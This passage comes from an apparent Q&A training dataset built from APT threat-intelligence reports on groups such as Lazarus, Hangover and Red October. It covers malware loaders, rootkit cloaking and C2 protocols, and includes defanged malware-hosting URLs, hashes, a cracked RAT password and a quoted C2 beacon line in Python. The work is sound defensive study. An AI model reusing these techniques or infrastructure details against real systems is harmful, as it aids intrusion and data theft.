    "output": "The Lazarus Group used legitimate third-party software, specifically an ActiveX vulnerability, as an initial infection vector. They exploited this vulnerability to gain access to target systems. This approach has significant implications for cybersecurity strategies, as it highlights the importance of securing third-party software and ensuring that all components within a network are regularly updated and patched. It also underscores the need for robust monitoring and detection mechanisms to identify unusual behavior associated with legitimate software.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: THE 'OSCAR' PROTOCOL\nNumerous computers were observed\t communicating with an 'alyac.org' subdomain on TCP\t port\t 80\t via the 'Oscar' protocol. Most, but\t not all,\t of the computers also\t communicated to the same domain via the 'Update?' communications.\t The protocol is\t believed to\t be associated\t with the same malware that produces the 'Update?' communications \u2013 the Destory RAT.\nEach\t compromised computer communicated at\t a different interval to the others, and\t accordingly,\t the malware on each of\t the compromised\t computers appears to have been individually\t configured.\t For example,\t one computer communicated every 12 seconds\tand\t another every\t16 seconds.\nEncrypted data was sent during each\t communication. The length of\t the encrypted data in each\t packet\t varied between 16 bytes and 89 bytes.\t After sending\t the encrypted data the malware waited for a response.\nMedium Headline: TABLE 5: 'BB' PROTOCOL PACKET FORMAT\nOnce decoded,\t the data reveals a basic beacon containing the computer name and IP address of\t the infected computer.\nAfter sending\t the basic beacon,\t the compromised computers waited for a response from the server,\t then closed the connection when they had\t not received a response from the server within five seconds.\nBoth\tof the compromised\t computers reattempted the communications approximately\t every\t eight seconds. On some days the high frequency\t of\t the beacon activity resulted in over 10000 connection attempts per victim in a 24 hour period.\nBig Headline: THE 'DB' PROTOCOL\nA single computer was observed\t communicating\t with the domain 'update.alyac.org' via the 'DB' protocol.\t The communications originated from the same Chinese computer network as one of\t the 'BB' victims but\t from a different\t computer on that\t network.\t It is not known what\t malware generates the 'DB' communications,\t or whether it is the same malware that generates the 'BB' communications.\nThe communications reveal detailed\t OS and system\t information about\t the compromised computer as shown in Table 6.\t The OS information reveals that\t the compromised\t computer is running Windows 2003 Server Service Pack 2. The detailed system\t information reveals that\t the compromised computer has an Intel Pentium\t Pro\u00adclass processor, four logical processors and\t an LGA 77542 Central Processing\t Unit (CPU) socket.\nMedium Headline: TABLE 6: SUMMARY OF FIRST 202 BYTES OF A 'DB' PACKET\nThe DB communications typically\t occurred at intervals of\t between 4\t and 92\t seconds, however, sometimes they were much further apart. After sending\t the detailed beacon to\t the command\t and control server,\t the compromised computer appeared to\t expect a response from the server.\n42 The combined processor level and processor revision information indicates the computer has an LGA 775\t CPU socket (Intel family 6/ model\t 15/ stepping\t 11). (Microsoft Corporation, 2011) (Wikipedia)\n43 On several occasions the 4 bytes\t '70 17 00 00'\t were prepended to the communications.\n\nWhat insights can be gained from analyzing the 'DB' protocol communications observed during the SK Communications hack? How might this information be useful for cybersecurity experts in mitigating future threats?",
    "output": "The 'DB' protocol communications observed during the SK Communications hack provide detailed OS and system information about the compromised computer. Specifically, the communications reveal that the compromised computer is running Windows 2003 Server Service Pack 2 and has an Intel Pentium Pro-class processor with four logical processors and an LGA 775 CPU socket. This detailed information is valuable for cybersecurity experts because it helps them understand the specific vulnerabilities and configurations that the attackers are targeting. By knowing the exact operating system and hardware specifications, security teams can better tailor their defenses and patch management strategies to protect against similar attacks. Additionally, recognizing the unique patterns and content of 'DB' protocol communications can aid in developing more effective detection mechanisms and incident response plans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the use of Derusbi malware in attacks on American think tanks relate to the Axiom threat group?",
    "output": "The use of Derusbi malware in attacks on American think tanks focusing on Iraq suggests a possible connection to the Axiom threat group. These attacks utilized watering-hole techniques and specifically targeted users with identified Chinese, US English, Russian, Japanese, or Korean language machines. While the link to Axiom is not definitive, the use of Derusbi is notable because this malware is not widely distributed beyond intermediate stages of operations attributed to Axiom. The shift in focus from East Asian policy to Middle Eastern policy may reflect China's renewed interest in the region due to its dependence on oil production.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How do attackers use Scheduled Tasks to maintain persistence and execute malicious code in the context of the Taiwan Heist APT?",
    "output": "Scheduled Tasks are a common mechanism used by attackers to maintain persistence and execute malicious code on compromised systems. In the context of the Taiwan Heist APT, the attackers used Scheduled Tasks to execute the BITSRAN malware, which was designed to spread and install additional payloads on the victim's network. Specifically, the attackers created a Scheduled Task named 'BITSRAN' on remote devices, which executed the malware every minute, allowing it to maintain persistence and continue spreading. This technique allows attackers to execute malicious code under the context of a specified account, potentially with elevated permissions, making it more difficult to detect and remove. Furthermore, the use of Scheduled Tasks can also be used to mask one-time execution under a trusted system process, making it harder to identify the malicious activity.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Gen 2 Analysis\nThe Gen 2 sub-family, like Gen 1.2, uses a DLL for the core of its RAT functionality. In order for the DLL to load, Gen 2 (starting with Gen 2.1) uses a loader application (referred to simply as \"the Loader\"). The Loader comes in the form of a standard executable image or a DLL image. Despite the different models, both variants of the Loader load the embedded DLL in the exact same way. The only difference between the executable and DLL versions of the Loader comes in how they handle the initialization of the embedded DLL.\nThe Loader obfuscates many strings by using a simple XOR encoding scheme. Decryption of encoded strings consists of taking the first value of the string as the XOR key, XOR'ing all subsequent bytes until the result of the XOR returns 0. The decoding of the encoded strings is handled by the DecodeString function.\nThe Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image. In order to locate the embedded DLL, LoadEmbeddedImage will use the DecodeString function to decrypt the delimiter string (which is typically zzzzzzzzzz or yyyyyyyyyy) and then search the icon's resource memory for the delimiter string. Once located, LoadEmbeddedImage will use the first 12 bytes immediately after the string as the information structure about the embedded DLL. The structure (seen below) defines the size of the embedded DLL within the icon's resource memory, the size of the\nDLL after it is decompressed and a 4-byte XOR key that LoadEmbeddedImage must use to decode the embedded DLL prior to decompression.\nLoadEmbeddedImage copies the compressed embedded DLL into a newly allocated heap buffer and then calls the function decodeBuffer (using the EncodingKey value) to decrypt the embedded DLL. Another heap buffer is allocated with a size equal to the value of dwImageSizeDecompressed.\t\n  The decompression buffer along with the now decoded compressed buffer are given to lzo_decompress which decompresses the compressed image using the LZO1X algorithm5 .\nWith the embedded DLL now decompressed into a heap buffer, LoadEmbeddedImage calls ImageLoaderData::LoadDll to manually load the DLL into memory.\nImageLoaderData::LoadDll interprets the PE/COFF header of the DLL image, loads the image into the appropriate memory configuration, performs the necessary relocation operations, and calls the DllMain (DLL's entry point) function.\nAfter loading the embedded DLL image into memory, the Loader will either call the DLL's StartServer or MatrixMain function depending on the type of Loader. The standalone Loaders use the MatrixMain function while the DLL Loaders will call the StartServer function. The Loaders, upon unloading, will call the StopServer function in order to shut down the embedded DLL.\nThe Gen 2 DLL exposes five exported functions (besides the DllEntryPoint/DllMain).\nMatrixMain and StartServer both ultimately generate a new thread (using the POSIX API function beginthreadex instead of the more common CreateThread) that contains the main loop of the Gen 2 RAT functionality. MatrixMain, however, has added functionality. The prototype for MatrixMain is as follows:\n5 Markus F.X.J. Oberhumer, \"LZO real-\u00ad\u2010time data compression library\" http://www.oberhumer.com/opensource/lzo/.\t\n \u00a029 June 2014.\nwhere Arguments parameter can be:\nIf the i parameter is given, the DLL will install itself as a service on the victim's machine. The DLL will create a new service (e.g. \"Network DDE Service\") and assign itself as the executable for the service.\nThe DLL's RAT functionality provides basic features such as network port forwarding (proxying), file transfer, and remote command shell. The RAT functionality provides an attacker with the ability to establish a phantom network within a victim's infrastructure by having individual instances of Gen 2 DLL listen for incoming connections on local ports (presumably, NAT'd ports) and accept commands from the inbound connection. This allows an attacker to establish several Gen2 infections within a victim's infrastructure and if outbound connectivity is prohibited for any of the infected machines, the attacker can route commands to the pseudo-isolated infections through accessible infected machines providing a high level of persistence to the malware. Each Gen 2 infection can support up to 10 listening ports.\nThe communication between the Gen 2 malware and the C2 (or other Gen 2 malware, in the case of the internal routing functionality) is encrypted using a simple DWORD XOR scheme. Each communication burst (either between the malware and the C2 or the malware and neighboring malware) begins with a 24-byte header identical to the header found in Gen 1.2. Immediately following the header is the type-specific (as indicated by the dwPayloadType field) payload data. Note that the dwXORKey value is NOT encoded with the XOR value, but rather is the value that is used for encoding the header and payload.\nEach DLL includes a hardcoded, default configuration. At the time that the RAT functionality activates, the DLL will drop the current configuration to disk. If the configuration file already exists, then the RAT will use the file version of the configuration over the default configuration. The configuration data structure (seen below) doubles as a current state record for some aspects of the communication subsystem of the DLL. When stored on disk, the configuration is preceded by a GUID value (16 bytes) that represents the unique identifier for the specific infection. The configuration is XOR encoded using the first 4 bytes (as a DWORD) of the GUID.\nIn order to provide some level of stealth, the RAT will install a rootkit on 32-bit versions of Windows. The DLL contains a device driver image embedded within an encoded buffer which the RAT functionality code will extract to the %TEMP% directory (after XOR'ing the buffer with 0x76). To activate the rootkit, the RAT functionality code creates a service with the driver in the %TEMP% directory as the executable for the service. The RAT functionality code then activates the service and opens a handle to device driver's interface (e.g. \\Globals\\HTTPS). With the handle open to the rootkit driver, the RAT functionality code deletes the service in order to reduce the visible footprint of the new driver. To further reduce the footprint of the driver, the RAT functionality code also uses the cloaking functionality of the rootkit to hide the DLL's PID, any references to the GUID {4AE26357-79A3-466D-A6D9FC38BFB67DEA}, the DLL's service names (e.g. \"NetDDESrv\" and \"Network DDE Service\") and the service entry as well. Additionally, the code also attempts to hide a service named \"Hitx\".\nBig Headline: Detection\nDetecting Hikit variants on disk and in memory is possible using the following YARA signature developed by Symantec:\nDetecting nominal Gen 1.2 and later network activity is problematic given the nature of the communication structure. The encrypted nature of the nominal Gen 1.2 and later network traffic makes a signature difficult. Snort signature 30948 may detect some Hikit based network traffic for only Gen 1.0 and Gen 1.1.\nFrom a system objects perspective, Gen 2 samples produce up to three named events. The event names change per infection, but have a common format. The following three strings represent the known mutex strings for Gen 2 samples:\nwhere the %s format variable is replaced with a UUID value string specific to the infected machine.\n\nAnswer this question based on the above context: How does the Gen 2 sub-family of Hikit malware utilize the Loader application to embed and execute its DLL? Describe the process in detail.",
    "output": "The Gen 2 sub-family of Hikit malware uses a Loader application to embed and execute its DLL. The Loader can come in the form of a standard executable image or a DLL image. Both variants of the Loader load the embedded DLL in the same way, with the only difference being how they handle the initialization of the embedded DLL. The Loader obfuscates many strings using a simple XOR encoding scheme, where the first value of the string is used as the XOR key to decrypt subsequent bytes until the result of the XOR returns 0. The Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image. To locate the embedded DLL, the LoadEmbeddedImage function uses the DecodeString function to decrypt the delimiter string (typically 'zzzzzzzzzz' or 'yyyyyyyyyy') and searches the icon's resource memory for this string. Once located, the first 12 bytes after the string serve as the information structure about the embedded DLL, including its size, decompressed size, and a 4-byte XOR key. The compressed embedded DLL is copied into a newly allocated heap buffer and decrypted using the decodeBuffer function. Another heap buffer is allocated for decompression, and the LZO1X algorithm is used to decompress the DLL. Finally, the ImageLoaderData::LoadDll function manually loads the DLL into memory, interpreting the PE/COFF header, performing relocation operations, and calling the DllMain function.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial malware\nThe initial installers of this campaign were discovered due to behavior similarities with previous Hangover-related malware. These appear to have been prepared for email distribution or possibly for web download. Four such installers were identified; files with the MD5 hash of:\n0392fb51816dd9583f9cb206a2cf02d9, (original name Brief DG Arty-8 30 Aug.scr ) e6d9fce2c6e766b0899ac2e1691b8097, (original name Debriefing Indian Missile Def Prg.scr) e013691e702778fa6dbc35b15555c3c2, (original name HQ Div Sp Eqs 21 Dec 2013 final.scr ) 9d299d3a074f2809985e0317b9c461eb, (original name HQ 19 div CTGY PLAN-Offn Objs.scr)\nThese are all self-extracting archives (WinRAR SFX RAR and SFX ZIP), which again contain lure documents and a malicious Python installer.\n0392fb51816dd9583f9cb206a2cf02d9:\nThese files are all created using the PyInstaller tool. The \"archive-viewer.py\" Python script provided with the PyInstaller package can be used to examine these installers:\nMost of the objects in these packages are legitimate libraries and components required by the installer itself. The highlighted \"send\" object is where the malicious Python script resides.\nAnd, as Python is a human-readable format, this makes analysis straightforward:\nPython function made for testing connection to Command & Control servers. Note how worldvoicetrip[.]com can supply a new C&C server (\"code4\") in domain.html.\nThere are two main functionalities for these scripts:\nHarvest system information using existing system tools like systeminfo.exe. This information is attempted uploaded to Command & Control (C&C) server.\nDownload and execute more malicious executables.\nBig Headline: Decoy documents\nThe documents accompanying the malware executables seem all related to Indian military matters. The excerpt below is labeled confidential; however the text is taken from a publicly available source at armscontrol.org. ((<https://www.armscontrol.org/act/2013_01-02/Indian-Missile-Defense-Program-Advances>)https://www.armscontrol.org/act/2013_01-02/Indian-Missile-Defense-Program-Advances)\nThis document contains references to Artillery Firing Data Computing Devices (AFDCD's), which are given to be Casio FX-750 and Casio FX-880-P. However, these are models of handheld calculators from 30 years ago. They are not used for military purposes today.\nAt least, I hope not.\nBig Headline: Case expansion\nCase expansion is the process of mapping out connections with other cases and malwares to understand the larger threat picture. This gives information about\nwhat activities are ongoing\nagainst whom\nusing what tools\nand how to mitigate\nThis process involves multiple iterations of pivoting by a great deal of possible parameters \u2013 similarities in malware, similarities in network traffic, various domain registration and hosting information, passive DNS data etc.\nWe begin with the beginning \u2013 what we can learn from the initial malware files.\nMedium Headline: Command & Control \u2013 hosted malware\nAs shown previously, the C&C servers used in these malwares were:\ngames-playbox[.]com worldvoicetrip[.]com\nThe latter server was down by the time we noticed the malware, but games-playbox[.]com still resolved to the IP 176.56.238.177, belonging to AS198203 ASN-ROUTELABEL RouteLabel V.O.F. in the Netherlands. Internal and public databases show that this server has been hosting malware for download: hxxp://games-playbox[.]com/testing1/download/reg.exe hxxp://176.56.238.177/testing2/download/reg.exe hxxp://176.56.238.177/testing2/download/reg1.exe hxxp://176.56.238.177/testing4/download/reg.exe hxxp://176.56.238.177/testing2/download/winrm.exe hxxp://176.56.238.177/testing2/download/sppsvc.exe hxxp://games-playbox[.]com/winone1/download/stisvc.exe hxxp://games-playbox[.]com/winone1/download/sppsvc.exe\nBrute force testing showed that at least subfolders winone2, winone3 and winone4 contained similar content as winone1.\nSmall Headline: sppsvc.exe:\nThis is a keylogger, which hooks keyboard and mouse events.\nIn connection with these findings we found that the same Python functionality was sometimes embedded in executable files of a slightly different format \u2013 namely py2exe. These files have a different internal structure than PyInstallers, but the embedded scripts can be extracted and decoded using the Python module uncompyle2.\nPassive DNS analysis shows that games-playbox[.]com has shared IP address with other suspicious domains:\nRdata results for ANY/176.56.238.177\nIndeed, techto-earth[.]com shows up in Google with an entry on the URL checking service URLQuery[.]net.\nThis download link (hxxp://techto-earth[.]com/eastwing/download/sppsvc.exe) was at the point of writing live, and the downloaded executable (md5 c571b77469ad3c5ef336860605ee85c6) was verified as a PyInstaller-based malware. Brute force attempts showed that this folder also contained stisvc.exe (md5 f2a1ca02bf4a63a3d4a6c6464f5a925b) and reg.exe; these have same functionality as the identically named executables found on games-playbox[.]com. The techto-earth[.]com domain now resolved to the IP address 81.4.125.90, similarly belonging to the Dutch provider RouteLabel.\nThe domain download-mgrwin[.]com which shared the IP 81.4.125.90 with techto-earth[.]com was also found to host similar malware:\nhxxp://download-mgrwin[.]com/southside/download1/stisvc.exe md5 6ec82e9eccb9bee050c9f7f2750d0c7c\nhxxp://download-mgrwin[.]com/southside/download1/sppsvc.exe md5 acfada8e91eda6cca2da66bbb032d924\nhxxp://download-mgrwin[.]com/eastside/download/sppsvc.exe md5 6dc9eee24f8d5cba1ca3919b87507d86\nMedium Headline: \"Nick Agroyes\"\nDomain registration information is useful for connecting cases. Though often falsified, reuse of the same registrant information is common, thus providing a way of linking different domains. download-mgrwin[.]com was registered on the email address info@communication-principals[.]com, purportedly belonging to one Nick Agroyes:\nThis is a faked record, but the same address was used to register other domains of which some have been documented used by malware - alertmymailsnotify[.]com, communication-principals[.]com, servicesprocessing[.]com and websourceing[.]com.\ncommunication-principals[.]com: md5: 664f32f06dd7bd8c94df6edfcf6285da\nThis is an exploited RTF file leveraging the CVE-2012-0158 RTF vulnerability which downloads a file from hxxp://communication-principals[.]com/vargualm12/putty.exe\nservicesprocessing[.]com:\nVirusTotal shows a number of links to malicious executables on this domain. hxxp://servicesprocessing[.]com/naspckn/plugins/wsutils.exe hxxp://servicesprocessing[.]com/naspckn/plugins/shlwapi.exe hxxp://servicesprocessing[.]com/panomasi/plugins/shlwapi.exe : md5 eeaf96b1988c7016780c0d91ce2451c8 hxxp://servicesprocessing[.]com/panomasi/plugins/wsutils.exe : md5 4a9a912a8610495029ef3df813272d8a\nMedium Headline: Other registrants\nThe file 4a9a912a8610495029ef3df813272d8a has also been hosted elsewhere, on alertmymail[.]com: hxxp://alertmymail[.]com/lotopoto07/plugins/wsutils.exe\nThis domain is registered on the registrant sakanika@rediffmail[.]com. Other domains owned by this entity are necessaries-documentation[.]com and accountsloginmail-process[.]com which show pDNS overlap with the previously mentioned malicious domains.\nPassive DNS investigation and malware hosting data shows additional overlaps with the domains newsfairprocessing[.]com and manufacturing-minds[.]com. These domains were registered to the registrant tomhanks542@gmail[.]com.\nMalware referenced in relation to these domains is for example:\nmd5: 6f9f2e57eb06c5385f7e9370a71aa34b. This is a MINGW C++ keylogger, hosted at:\nhxxp://newsfairprocessing[.]com/imopo99/plugins/rpcapd.exe hxxp://necessaries-documentation[.]com/khtergf5541/plugins/rpcapd.exe\nMedium Headline: AutoIt\nThough many of the malwares we have examined in this campaign were based on Python, a number of similar malware files were found to be based on a different scripting language \u2013 AutoIt. One such malware is known under the family name Emupry or AutoIt/Emupry.\nThe executable file \"Quetta_Killings_Footage.exe\" (md5 387947d5891aeb2c32f231e9abadfcec) connects to the known malicious domain communication-principals[.]com. When the AutoIt script is extracted we see that important variables are base64-encoded. For clarity, these have shown inline as comments below:\nVery similar AutoIt malware was found for the following C&C servers (domains in bold were documented in the original Hangover report):\nMedium Headline: HTTP request format\nNote the form of the HTTP requests used by this AutoIt malware: http://server/folder/online.php?sysname=.\nThe Python malware we mentioned first in this article constructed identical requests: dfiles5 = urlopen(\"http://\"+ getserver + foldername+ \"/online.php?sysname=\"+cname+\"\")\nThis request form was used in a number of Hangover-related cases as well. Given the similarities in methodology and targeting we consider it highly likely that the current attack malware and the Hangover infrastructures are related. It points towards the use of the same backend infrastructure, designed to control different types of malware.\nAbove: Infrastructure map.\nQuestion: What is the significance of the decoy documents used in the Hangover operation? How do these documents contribute to the overall effectiveness of the attack?",
    "output": "Answer: The decoy documents used in the Hangover operation are related to Indian military matters and are labeled as confidential, although the text is taken from publicly available sources. These documents contribute to the overall effectiveness of the attack by making the malicious emails or downloads appear legitimate and enticing to the targeted individuals. By including references to specific military equipment or programs, the attackers increase the likelihood that the recipients will open the attachments, thereby executing the embedded malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the introduction of the MiniDuke and CozyDuke toolsets in 2011 reflect the evolution of the Dukes' capabilities and strategies?",
    "output": "The introduction of MiniDuke and CozyDuke in 2011 shows the Dukes' continuous effort to expand and diversify their arsenal. MiniDuke, a simplistic backdoor component, shares technical similarities with GeminiDuke, suggesting shared source code and a focus on remote command execution. CozyDuke, on the other hand, represents a significant advancement with its modular design, allowing for selective functionality based on mission requirements. This modular approach and the use of C++ indicate a shift towards more sophisticated and flexible malware development, possibly influenced by a software development background rather than traditional malware writing.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 5 Timeline of the Attack\nThe attack can roughly be divided in three phases.\n\u25a1 The first phase was the initial compromise and achievement of objectives. The objectives included the privilege escalation and espionage of intellectual property.\n\u25a1 The second phase was the persistence phase, which lasted for seven months.\n\u25a1 In the final phase, the attackers changed their persistence strategy from Phase 2 and attempted to exfiltrate data again. This was likely a reaction to a detection of an attack to another company with the same IOCs.\nThe following table describes the timeline of the attack with anonymous hostnames. The timestamps were converted to UTC+0. The \"Attacker\" column describes which resource (IP, compromised system, etc.) the attacker uses, and the \"Target\" column describes the system, which is targeted by the activity.\nTimestamp20 (<>)\nTarget\nAttacker\nComment\n20 All timestamps in this report are given in UTC+0\nInternet Cutoff and Remediation\nQuestion: Can you explain the different phases of the EmissaryPanda attack and how the attackers adapted their persistence strategy over time?",
    "output": "Answer: The EmissaryPanda attack can be divided into three distinct phases. The first phase involved the initial compromise and achievement of objectives, including privilege escalation and espionage of intellectual property. The second phase was the persistence phase, which lasted for seven months. During this phase, the attackers maintained their presence within the compromised environment. In the final phase, the attackers changed their persistence strategy from Phase 2 and attempted to exfiltrate data again. This change in strategy was likely a reaction to the detection of an attack on another company with the same Indicators of Compromise (IOCs), indicating that the attackers were aware of potential detection and adapted their methods accordingly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Did you sinkhole any of the Command & Control servers?\nWe were able to sinkhole six of the over 60 domains used by the various versions of the malware. During the monitoring period (2 Nov 2012 - 10 Jan 2013), we registered over 55,000 connections to the sinkhole. The number of different IPs connecting to the sinkhole was 250.\nFrom the point of view of country distribution of connections to the sinkhole, we have observed victims in 39 countries, with most of IPs being from Switzerland. Kazakhstan and Greece follow next.\nSinkhole statistics - 2 Nov 2012 - 10 Jan 2013\nMedium Headline: Is Kaspersky Lab working with any governmental organizations, Computer Emergency Response Teams (CERTs), law enforcement agencies or security companies as part of the investigation and disinfection efforts?\nKaspersky Lab, in collaboration with international organizations, Law Enforcement, Computer Emergency Response Teams (CERTs) and other IT security companies is continuing its investigation of Operation Red October by providing technical expertise and resources for remediation and mitigation procedures.\nKaspersky Lab would like to express their thanks to: US-CERT, the Romanian CERT and the Belarusian CERT for their assistance with the investigation.\nIf you are a CERT and would like more information about infections in your country, please contact us at theflame@kaspersky.com.\nHere's a (<http://www.securelist.com/en/analysis/204792262/Red_October_Diplomatic_Cyber_Attacks_Investigation>)link to the full paper (part 1) about our Red October research. During the next days, we'll be publishing Part 2, which contains a detailed technical analysis of all the known modules. Please stay tuned.\nA list of MD5s of known documents used in the Red October attacks:\n114ed0e5298149fc69f6e41566e3717a 1f86299628bed519718478739b0e4b0c 2672fbba23bf4f5e139b10cacc837e9f 350c170870e42dce1715a188ca20d73b 396d9e339c1fd2e787d885a688d5c646 3ded9a0dd566215f04e05340ccf20e0c 44e70bce66cdac5dc06d5c0d6780ba45 4bfa449f1a351210d3c5b03ac2bd18b1 4ce5fd18b1d3f551a098bb26d8347ffb 4daa2e7d3ac1a5c6b81a92f4a9ac21f1 50bd553568422cf547539dd1f49dd80d 51edea56c1e83bcbc9f873168e2370af 5d1121eac9021b5b01570fb58e7d4622 5ecec03853616e13475ac20a0ef987b6 5f9b7a70ca665a54f8879a6a16f6adde 639760784b3e26c1fe619e5df7d0f674 65d277af039004146061ff01bb757a8f 6b23732895daaad4bd6eae1d0b0fef08 731c68d2335e60107df2f5af18b9f4c9 7e5d9b496306b558ba04e5a4c5638f9f 82e518fb3a6749903c8dc17287cebbf8 85baebed3d22fa63ce91ffafcd7cc991 91ebc2b587a14ec914dd74f4cfb8dd0f 93d0222c8c7b57d38931cfd712523c67 9950a027191c4930909ca23608d464cc 9b55887b3e0c7f1e41d1abdc32667a93 9f470a4b0f9827d0d3ae463f44b227db a7330ce1b0f89ac157e335da825b22c7 b9238737d22a059ff8da903fbc69c352 c78253aefcb35f94acc63585d7bfb176 fc3c874bdaedf731439bbe28fc2e6bbe bb2f6240402f765a9d0d650b79cd2560 bd05475a538c996cd6cafe72f3a98fae c42627a677e0a6244b84aa977fbea15d cb51ef3e541e060f0c56ac10adef37c3\nceac9d75b8920323477e8a4acdae2803 cee7bd726bc57e601c85203c5767293c d71a9d26d4bb3b0ed189c79cd24d179a d98378db4016404ac558f9733e906b2b dc4a977eaa2b62ad7785b46b40c61281 dc8f0d4ecda437c3f870cd17d010a3f6 de56229f497bf51274280ef84277ea54 ec98640c401e296a76ab7f213164ef8c f0357f969fbaf798095b43c9e7a0cfa7 f16785fc3650490604ab635303e61de2\n\nHow did Kaspersky Lab manage to monitor the connections to the Command & Control (C&C) servers of the Red October malware, and what insights did they gain from this process?",
    "output": "Kaspersky Lab managed to monitor the connections to the C&C servers by sinkholing six out of the over 60 domains used by the various versions of the Red October malware. During the monitoring period from November 2, 2012, to January 10, 2013, they registered over 55,000 connections to the sinkhole from 250 different IP addresses. These connections originated from 39 countries, with the highest number of IPs coming from Switzerland, followed by Kazakhstan and Greece. This monitoring effort provided valuable insights into the geographical distribution of the victims and the extent of the infection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: 5.1 Description\nOn one of the proxy server, we identified a binary called Terminator3.6.exe. After a quick analysis we noticed that this binary is the server side of a homemade Remote Administration Tool (RAT). After analysis, we identified that this sample corresponds to Fakem RAT discovered by Trendmicro in January 2013. Additional information can be found there: http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf.\nWe were lucky enough to find the client side (the malware) on the same server. These two binaries allowed us to test the product and see how it works.\nMedium Headline: 5.2 Password protection\nWhen the server is starting, a password is asked:\nWe decided to crack this password. A CRC is generated based on the supplied password. Here is the algorithm of this CRC:\nAfter this operation, a xor, then a compare operation is done:\nTo obtain the password, we developed a brute forcer; the code source is available in the appendix.\nThe first argument is the maximum number or characters and the second is the value used in the comparison (available in the ASM code).\nIn this case the password to start the server is \"Ap@hX\".\nAnswer this question: How did the investigators manage to identify and verify the password required to start the server component of the Fakem RAT, which was associated with APT1?",
    "output": "The investigators managed to identify and verify the password required to start the server component of the Fakem RAT through a series of technical steps. First, they recognized that the server prompted for a password upon startup. They then analyzed the binary and discovered that a CRC (Cyclic Redundancy Check) was generated based on the supplied password. This CRC underwent a XOR operation followed by a comparison operation. To crack the password, the investigators developed a brute force tool. The brute force tool took the maximum number of characters and the value used in the comparison (found in the assembly code) as inputs. Through this process, they successfully determined that the password to start the server was 'Ap@hX'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Attribution to Lazarus Group\nAttribution is a controversial topic and arguably one of the most difficult tasks threat intelligence analysts face. However, based on our research, we assess with a high level of confidence given the information available to us that the operations and activity discussed in this research are attributed to Lazarus Group and ultimately North Korea.\nIn consideration of the controversial and difficult task at hand, we are providing an above and beyond summary of just some of the key pieces and overlaps to validate our assessment. Key reasons, discussed in detail below, are Encryption, Obfuscation, Functionality, Code Overlap, Decoys, and C&C.\nMedium Headline: Encryption\nIn October 2016 Lazarus Group pulled off a major operation that allegedly compromised (<https://badcyber.com/several-polish-banks-hacked-information-stolen-by-unknown-attackers/>)at least 20 banks in Poland as well as banks in other countries around the world. The attacks have been well documented by (<https://baesystemsai.blogspot.com/2017/02/lazarus-watering-hole-attacks.html>)BAE, (<https://securelist.com/files/2017/04/Lazarus_Under_The_Hood_PDF_final.pdf>)Kaspersky,(<https://www.welivesecurity.com/2017/02/16/demystifying-targeted-malware-used-polish-banks/>) ESET, (<https://blog.trendmicro.com/trendlabs-security-intelligence/ratankba-watering-holes-against-enterprises/>)TrendMicro, and (<https://www.symantec.com/connect/blogs/attackers-target-dozens-global-banks-new-malware-0>)Symantec. The attribution of this attack to Lazarus (aka, Bluenoroff) and ultimately North Korea is widely (<https://www.nytimes.com/2017/03/25/technology/north-korea-hackers-global-banks.html>)accepted across the (<https://edition.cnn.com/2017/04/03/world/north-korea-hackers-banks/index.html>)industry. What has not been documented publicly, to our knowledge, are the specifics behind the implementation of the (<https://www.schneier.com/blog/archives/2014/10/spritz_a_new_rc.html>)Spritz encryption cipher utilized in some of the implants surrounding the banking incidents in late 2016 and early 2017.\nSpritz is self-described as a (<https://people.csail.mit.edu/rivest/pubs/RS14.pdf>)spongy RC4-like stream cipher that was designed by Ronald Rivest and Jacob Schuldt. Multiple implementations of Spritz exist on Github in languages like C and (<https://github.com/edwardcunningham/spritz>)Python. Anyone researching Lazarus Group's version of Spritz will quickly find out that neither of the previously mentioned implementations will successfully decrypt hidden payloads in either banking related implants nor PowerSpritz's legitimate installer payload and malicious PowerShell commands.\nThe issue, or possibly feature, in Lazarus Group's implementation of Spritz can be found buried in a single paragraph on page five of the original (<https://people.csail.mit.edu/rivest/pubs/RS14.pdf>)Spritz publication (Fig. 51). It states that addition and subtraction may be substituted for exclusive-or (XOR) and is referred to Spritz-xor.\nExamining Lazarus Group's implementation of Spritz in one of the original implants utilized to compromise banks in late 2016 and 2017 via watering hole attacks, it quickly becomes apparent that they have actually implemented Spritz-xor instead of the normal Spritz algorithm (Fig. 52).\nMedium Headline: Obfuscation\nEarlier this year several watering hole attacks targeting South Korea utilized an ActiveX 0day exploit in M2Soft to deliver Lazarus-connected FBI-RAT and Charon implants. Some of the techniques observed in these attacks overlap with the JS downloader and CHM PowerRatankba campaigns. One such overlap was through the usage of a well-known JS obfuscation technique in both the M2Soft exploit and PowerRatankba JS downloader campaigns. The method is a public and widely used technique of masking strings using their hexadecimal values and placing them in an array assigned to a variable with a naming structure of _0x[a-f0-9]{4} (Fig. 54).\nMedium Headline: Functionality\nSeveral features in the original Ratankba implants are similar or identical when compared to PowerRatankba and RatankbaPOS. Furthermore, the usage of a common directory c:\\windows\\temp\\ for the storage of implants and logs are seen across a wide array of Lazarus Group's toolset. A brief overview of similar features is shown in below (Table 3) while a detailed description of each overlap may be found below.\nTable 3: Feature comparison table\nFirst consider the C&C protocols utilized in all Ratankba, PowerRatankba, and RatankbaPOS. Ratankba's initial POST to C&C to divulge compromised system information uses the same BaseInfo parameter as PowerRatankba. Additionally, a Ratankba sample (bd7332bfbb6fe50a501988c3834a160cf2ad948091d83ef4de31758b27b2fb7f) utilizes a C&C of list.jsp while RatankbaPOS utilizes an identical URIfile name for allegedly exfiltrating credit 